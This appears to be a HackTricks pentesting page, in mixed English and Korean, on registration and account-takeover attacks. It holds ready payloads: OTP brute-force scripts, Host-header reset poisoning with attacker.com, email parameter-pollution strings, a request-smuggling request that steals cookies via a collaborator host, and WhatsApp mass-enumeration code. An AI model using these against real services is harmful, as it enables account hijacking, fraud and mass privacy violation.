# Registration & Takeover Vulnerabilities

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Try to generate using an existing username
- Check varying the email:
- 대문자 사용
- +1@
- 이메일에 점 추가
- special characters in the email name (%00, %09, %20)
- Put black characters after the email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Try email provider canonicalization tricks (service-dependent):
- Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Some providers are case-insensitive in the local-part
- Some providers accept unicode confusables. Try homoglyphs and soft hyphen `\u00AD` within the local-part
- Abuse these to: bypass uniqueness checks, obtain duplicate accounts/workspace invites, or block victim sign‑ups (temporary DoS) while you prepare a takeover

### Username Enumeration

Check if you can figure out when a username has already been registered inside the application.

- Different error messages or HTTP status codes
- Timing differences (existing user may trigger lookup to IdP/DB)
- Registration form autofill of profile data for known emails
- Check team/invite flows: entering an email may reveal whether an account exists

### Password Policy

Creating a user check the password policy (check if you can use weak passwords).\
In that case you may try to bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)레지스트리 양식에서 **SQL Injections**를 통해 account takeovers를 시도하거나 정보를 추출하는 방법을 알아보세요.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

When registered try to change the email and check if this change is correctly validated or can change it to arbitrary emails.

### More Checks

- Check if you can use **일회용 이메일** (mailinator, yopmail, 1secmail, etc.) or bypass the blocklist with subaddressing like `victim+mailinator@gmail.com`
- **긴** **비밀번호** (>200)은 **DoS**를 유발할 수 있음
- **계정 생성에 대한 rate limits를 확인하세요**
- username@**burp_collab**.net을 사용하고 **callback**을 분석하세요
- If phone number verification is used, check phone parsing/injection edge cases

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers expose a **presence oracle** whenever the client syncs contacts. Replaying WhatsApp’s discovery requests historically delivered **>100M lookups per hour**, enabling near-complete account enumerations.

**Attack workflow**

1. **Instrument an official client** to capture the address-book upload request (authenticated blob of normalized E.164 numbers). Replay it with attacker-generated numbers while reusing the same cookies/device token.
2. **Batch numbers per request**: WhatsApp accepts thousands of identifiers and returns registered/unregistered plus metadata (business, companion, etc.). Analyze responses offline to build target lists without messaging victims.
3. **Horizontally scale** enumeration with SIM banks, cloud devices, or residential proxies so per-account/IP/ASN throttling never triggers.

**Dialing-plan modeling**

Model each country’s dialing plan to skip invalid candidates. The NDSS dataset (`country-table.*`) lists country codes, adoption density, and platform split so you can prioritize high-hit ranges. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
처리량을 유용하게 유지하려면 오라클에 질의하기 전에 실제 할당과 일치하는 접두사(Mobile Country Code + National Destination Code)를 우선시하세요.

**Turning enumerations into targeted attacks**

- 오라클에 leaked phone numbers(예: Facebook’s 2021 breach)를 투입하여 phishing, SIM-swapping, 또는 spamming을 시도하기 전에 어떤 계정이 여전히 활성 상태인지 확인하세요.
- 국가/OS/앱 유형별로 인구조사를 분할하여 SMS 필터링이 약한 지역이나 지역별 social engineering에 유리한 WhatsApp Business 채택률이 높은 지역을 찾아보세요.

**Public-key reuse correlation**

WhatsApp는 세션 설정 중에 각 계정의 X25519 identity key를 노출합니다. 열거된 모든 번호에 대해 identity material을 요청하고 public keys를 중복 제거하여 account farms, cloned clients, 또는 insecure firmware를 밝혀내세요 — 공유 키는 multi-SIM 운영의 익명성을 제거합니다.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows는 종종 숫자 OTP 또는 magic-link 토큰으로 소유권을 확인합니다. 일반적인 취약점:

- 예측 가능하거나 짧은 OTP(4–6자리)로 효과적인 속도 제한(rate limiting)이나 IP/디바이스 추적이 없는 경우. 병렬 추측(parallel guesses)와 헤더/IP 회전을 시도하세요.
- OTP가 액션 또는 계정 간에 재사용되거나 특정 사용자/동작에 바인딩되어 있지 않음(예: 동일한 코드가 로그인과 회원가입 모두에 작동하거나 이메일 변경 후에도 작동).
- Multi-value smuggling: 일부 백엔드는 여러 코드를 수락하고 그중 하나가 일치하는지 확인합니다. 시도해보세요:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: 상태/메시지/본문 길이로 wrong vs expired vs wrong-user 코드를 구분하세요.
- 성공 후나 비밀번호/이메일 변경 후 토큰이 무효화되지 않음.
- Verification token이 user agent/IP에 묶여 있지 않아 공격자가 제어하는 페이지에서 cross-origin으로 검증을 완료할 수 있음.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
병렬/동시 추측으로 순차적 잠금 우회 (Burp의 Turbo Intruder 사용):

<details>
<summary>Turbo Intruder 스니펫 — 6자리 OTP 시도 대량 전송</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 동일한 유효한 OTP를 두 세션에서 동시에 제출해보세요; 때때로 한 세션은 공격자 계정으로 인증되고 피해자 흐름도 성공합니다.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

공격자가 피해자의 이메일에서 계정 생성 전에 조작을 수행하고 나중에 접근을 재획득할 때 발생하는 강력한 문제 클래스입니다.

테스트할 주요 기법(대상 흐름에 맞게 조정):

- Classic–Federated Merge
  - 공격자: 피해자 이메일로 classic 계정을 등록하고 비밀번호를 설정함
  - 피해자: 이후 SSO(같은 이메일)로 가입함
  - 취약한 병합은 양쪽 모두 로그인 상태를 유지시키거나 공격자의 접근을 되살릴 수 있음
- Unexpired Session Identifier
  - 공격자: 계정을 생성하고 장기 세션을 유지(로그아웃하지 않음)
  - 피해자: 비밀번호를 복구/설정하고 계정을 사용함
  - 리셋 또는 MFA 활성화 이후에도 이전 세션이 유효한지 테스트하세요
- Trojan Identifier
  - 공격자: 미리 생성한 계정에 2차 식별자 추가(전화번호, 추가 이메일 또는 공격자의 IdP 연결)
  - 피해자: 비밀번호 재설정; 이후 공격자가 Trojan Identifier를 사용해 재설정/로그인함
- Unexpired Email Change
  - 공격자: 이메일 변경을 공격자 메일로 시작하고 확인을 보류함
  - 피해자: 계정을 복구하고 사용을 시작함
  - 공격자: 이후 보류 중인 이메일 변경을 완료해 계정을 탈취함
- Non‑Verifying IdP
  - 공격자: 이메일 소유권을 검증하지 않는 IdP를 사용해 `victim@…`을 주장함
  - 피해자: classic 경로로 가입함
  - 서비스가 `email_verified`를 확인하거나 로컬 검증을 수행하지 않고 이메일로 병합할 수 있음

실무 팁

- 웹/모바일 번들에서 흐름과 엔드포인트를 수집하세요. classic signup, SSO linking, 이메일/전화 변경, 비밀번호 재설정 엔드포인트를 찾아보세요.
- 다른 흐름을 테스트하는 동안 세션을 유지하기 위해 현실적인 자동화를 만드세요.
- SSO 테스트의 경우 테스트 OIDC provider를 세팅하고 피해자 주소에 대한 `email` 클레임과 `email_verified=false`로 토큰을 발행해 RP가 검증되지 않은 IdP를 신뢰하는지 확인하세요.
- 비밀번호 재설정이나 이메일 변경 후 다음을 확인하세요:
  - 모든 다른 세션과 토큰이 무효화되는지,
  - 보류 중인 이메일/전화 변경 기능이 취소되는지,
  - 이전에 연결된 IdP/이메일/전화번호가 다시 검증되는지.

참고: 이러한 기법들에 대한 광범위한 방법론과 사례 연구는 Microsoft의 pre‑hijacking 연구에 문서화되어 있습니다(참조는 문서 하단 참조).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 자신의 이메일 주소로 password reset을 요청하세요.
2. password reset 링크를 클릭하세요.
3. 비밀번호를 변경하지 마세요.
4. 임의의 3rd party 웹사이트(예: Facebook, twitter)를 클릭하세요.
5. Burp Suite proxy에서 요청을 가로채세요.
6. referer header가 password reset token을 leak하는지 확인하세요.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite에서 password reset 요청을 가로채세요.
2. Burp Suite에서 다음 헤더를 추가하거나 편집하세요: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 수정된 헤더로 요청을 전달하세요\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_를 기반으로 한 password reset URL을 찾아보세요. 예: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 공격자는 자신의 계정으로 로그인하고 **비밀번호 변경** 기능으로 이동해야 합니다.
2. Burp Suite를 시작하고 요청을 Intercept 합니다
3. 요청을 repeater 탭으로 보내고 파라미터를 수정합니다 : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

비밀번호 재설정 token은 매번 무작위로 생성되고 고유해야 합니다.\
token이 만료되는지 또는 항상 동일한지 확인해보세요. 경우에 따라 생성 알고리즘이 약해 추측이 가능합니다. 알고리즘에 사용될 수 있는 변수는 다음과 같습니다.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 특정 이메일(예: test@mail.com)에 대해 API/UI를 사용하여 password reset request를 트리거합니다.
2. 서버 응답을 검사하고 `resetToken`이 있는지 확인합니다.
3. 그런 다음 해당 토큰을 다음과 같은 URL에 사용합니다: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 피해자의 username과 동일하지만 앞뒤에 공백을 삽입한 username으로 시스템에 등록합니다. 예: `"admin "`
2. 악의적인 username으로 password reset을 요청합니다.
3. 자신의 이메일로 전송된 토큰을 사용해 피해자의 비밀번호를 재설정합니다.
4. 새 비밀번호로 피해자 계정에 접속합니다.

플랫폼 CTFd는 이 공격에 취약했습니다.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 애플리케이션 또는 서브도메인에서 XSS를 찾습니다. 쿠키가 부모 도메인(`*.domain.com`)에 scope되어 있다면 특히 유효합니다.
2. 현재 **sessions cookie**를 Leak 합니다
3. 그 쿠키를 사용해 사용자로 인증합니다

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler**를 사용해 HTTP Request Smuggling의 유형을 탐지합니다 (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 다음 데이터로 `POST / HTTP/1.1`를 덮어쓸 요청을 제작합니다:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 목표는 피해자를 burpcollab으로 open redirect 시켜 쿠키를 탈취하는 것입니다\
3. 최종 요청은 다음과 유사할 수 있습니다
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone에 이 버그를 악용한 리포트:
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF용 payload 생성, 예: “HTML form with auto submit for a password change”
2. payload 전송

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token은 사용자 인증에 사용될 수 있다.

- JWT를 다른 User ID / Email로 수정
- 약한 JWT 서명 확인


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

일부 signup handlers는 제공된 email이 이미 존재할 경우 upsert를 수행한다. 만약 endpoint가 email과 password만 포함한 최소한의 body를 허용하고 ownership verification을 요구하지 않는다면, 피해자의 email을 전송함으로써 pre-auth 상태에서 그들의 password를 덮어쓸 수 있다.

- 발견: 번들된 JS(또는 mobile app traffic)에서 endpoint 이름을 수집한 다음 ffuf/dirsearch로 /parents/application/v4/admin/FUZZ 같은 base paths를 fuzz한다.
- 방법 힌트: GET이 "Only POST request is allowed." 같은 메시지를 반환하면 올바른 verb와 JSON body가 기대된다는 것을 자주 나타낸다.
- 실제로 관찰된 최소 body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
예제 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
영향: reset token, OTP, 또는 email verification 없이 Full Account Takeover (ATO)을 완전히 달성할 수 있음.

## 참고자료

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
